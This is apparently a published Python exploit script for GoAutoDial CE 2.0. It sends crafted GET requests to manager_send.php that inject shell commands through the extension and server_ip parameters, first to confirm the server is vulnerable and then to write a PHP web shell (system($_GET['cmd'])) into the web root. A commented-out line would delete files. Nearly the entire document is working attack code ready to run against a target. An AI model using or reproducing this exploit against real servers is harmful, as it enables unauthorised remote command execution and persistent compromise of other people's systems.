# Date : 28/02/2015
# Author : R-73eN
# Software : GoAutoDial CE 2.0
# Tested : On Linux vicisrv.loc 2.6.18-238.9.1.el5.goPAE #1  GoAutoDial CE 2.0
 
import socket
import sys
banner = "\n\n"
banner +="  ___        __        ____                 _    _  \n" 
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || &#039;_ \| |_ / _ \| |  _ / _ \ &#039;_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner
CRLF = "\r\n"
def checkvuln():
    command = "uname"
    evil = path + &#039;/manager_send.php?enable_sipsak_messages=1&allow_sipsak_messages=1&protocol=sip&ACTION=OriginateVDRelogin&session_name=AAAAAAAAAAAA&server_ip=%27%20OR%20%271%27%20%3D%20%271&extension=%3B&#039; + command + &#039;%3B&user=&#039; + user + &#039;&pass=&#039; + password
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,80))
    evilREQ = &#039;GET &#039; + evil + &#039; HTTP/1.1&#039; + CRLF + &#039;Host: &#039; + host + CRLF + &#039;User-Agent: Infogen-AL&#039; + CRLF + CRLF + CRLF
    s.send(evilREQ)
    a = s.recv(1024)
    if(a.find("HTTP/1.1 200 OK") != -1 and a.find("Linux") != -1):
        print &#039;[ + ] Server Is vulnerable [ + ]\n&#039;
        shellupload()
    else:
        print &#039;[ - ] Server is not vulnerable [ - ]\n&#039;
    s.close()
 
 
def shellupload():
    command = "echo &#039;Infogen-AL<br><?php echo system($_GET[&#039;cmd&#039;]);?>&#039; > /var/www/html/infogen.php"
    #command = "rm /var/www/html/123.pl;rm /var/www/html/TEST.perl"
    command = command.replace(" ", "%20")
    evil = path + &#039;/manager_send.php?enable_sipsak_messages=1&allow_sipsak_messages=1&protocol=sip&ACTION=OriginateVDRelogin&session_name=AAAAAAAAAAAA&server_ip=%27%20OR%20%271%27%20%3D%20%271&extension=%3B&#039; + command + &#039;%3B&user=&#039; + user + &#039;&pass=&#039; + password
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,80))
    evilREQ = &#039;GET &#039; + evil + &#039; HTTP/1.1&#039; + CRLF + &#039;Host: &#039; + host + CRLF + &#039;User-Agent: Infogen-AL&#039; + CRLF + CRLF + CRLF
    s.send(evilREQ)
    a = s.recv(1024)
    if(a.find("HTTP/1.1 200 OK") != -1 and a.find("Invalid") == -1):
        print &#039;[ + ] Shell uploaded successfully [ + ]\n&#039;
        print &#039;[ + ] http://&#039; + host + &#039;/infogen.php [ + ]\n&#039;
    else:
        print &#039;[ - ] Shell upload failed.... [ - ]&#039;
    s.close()
 
if(len(sys.argv) < 4):
    print &#039;\n Usage : exploit.py 127.0.0.1 /goautodial-agent/ agentuser agentpassword\n&#039;
else:
    host = sys.argv[1]
    path = sys.argv[2]
    user = sys.argv[3]
    password = sys.argv[4]
    checkvuln()
    print &#039;Visit Us : http://infogen.al/&#039;

